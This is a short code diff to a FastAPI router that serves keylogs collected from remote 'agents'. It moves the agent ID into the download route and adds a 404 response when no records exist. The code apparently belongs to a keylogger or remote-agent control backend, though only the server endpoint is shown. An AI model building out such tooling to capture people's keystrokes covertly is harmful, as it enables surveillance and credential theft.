@@ -1,6 +1,6 @@
 from datetime import datetime
 import json
-from fastapi import APIRouter, Depends, Query, Path, Body
+from fastapi import APIRouter, Depends, HTTPException, Query, Path, Body
 from fastapi.responses import StreamingResponse
 from sqlalchemy.orm import Session
 
@@ -97,7 +97,7 @@ def get_keylogs(
         "data": results
     }
 
-@router.get("/download")
+@router.get("/download/{agent_id}")
 def download_keylogs(
     agent_id: str = Path(..., description="ID of the agent to download keylogs for"),
     db: Session = Depends(get_db)
@@ -110,6 +110,9 @@ def download_keylogs(
         .filter(Keylog.agent_id == agent_id)
         .order_by(Keylog.timestamp.asc())
     )
+
+    if not query.first():
+        raise HTTPException(status_code=404, detail="No keylog data found for this agent")
 
     def generate():
         for log in query:
